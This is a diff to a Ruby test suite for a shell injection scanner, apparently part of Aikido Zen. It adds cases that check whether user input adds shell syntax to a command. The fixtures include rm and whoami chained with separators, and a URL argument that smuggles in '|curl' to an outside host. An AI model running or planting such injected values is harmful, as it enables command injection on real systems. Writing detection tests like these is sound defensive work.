@@ -11,12 +11,12 @@ class Aikido::Zen::Scanners::ShellInjectionScanner::HelpersTest < ActiveSupport:
     refute Aikido::Zen::Scanners::ShellInjectionScanner::Helpers.is_safely_encapsulated(command, user_input)
   end
 
-  def assert_contains_shell_syntax(command, command2 = command)
-    assert Aikido::Zen::Scanners::ShellInjectionScanner::Helpers.contains_shell_syntax(command, command2)
+  def assert_contains_shell_syntax(command, user_input = command)
+    assert Aikido::Zen::Scanners::ShellInjectionScanner::Helpers.contains_shell_syntax(command, user_input)
   end
 
-  def refute_contains_shell_syntax(command, command2 = command)
-    refute Aikido::Zen::Scanners::ShellInjectionScanner::Helpers.contains_shell_syntax(command, command2)
+  def refute_contains_shell_syntax(command, user_input = command)
+    refute Aikido::Zen::Scanners::ShellInjectionScanner::Helpers.contains_shell_syntax(command, user_input)
   end
 
   test "safe between single quotes" do
@@ -103,5 +103,30 @@ class Aikido::Zen::Scanners::ShellInjectionScanner::HelpersTest < ActiveSupport:
 
   test "it detects commands surrounded by separators" do
     assert_contains_shell_syntax 'find /path/to/search -type f -name "pattern" -exec rm {} \\\\;', "rm"
+  end
+
+  test "it detects commands with separator before" do
+    assert_contains_shell_syntax "find /path/to/search -type f -name \"pattern\" | xargs rm", "rm"
+  end
+
+  test "it detects commands with separator after" do
+    assert_contains_shell_syntax "rm arg", "rm"
+    assert_contains_shell_syntax " rm\twhoami  ", "whoami"
+    assert_contains_shell_syntax "\trm arg\t", "rm"
+    assert_contains_shell_syntax "rm\t", "rm"
+  end
+
+  test "it checks if the same command occurs in the user input" do
+    refute_contains_shell_syntax "find cp", "rm"
+  end
+
+  test "it treats colon as a command" do
+    assert_contains_shell_syntax ":|echo", ":|"
+    refute_contains_shell_syntax "https://www.google.com", "https://www.google.com"
+  end
+
+  test "it flags input as shell injection" do
+    assert_contains_shell_syntax "command -disable-update-check -target https://examplx.com|curl+https://cde-123.abc.domain.com+%23 -json-export /tmp/5891/8526757.json -tags microsoft,windows,exchange,iis,gitlab,oracle,cisco,joomla -stats -stats-interval 3 -retries 3 -no-stdin",
+      "https://examplx.com|curl+https://cde-123.abc.domain.com+%23"
   end
 end
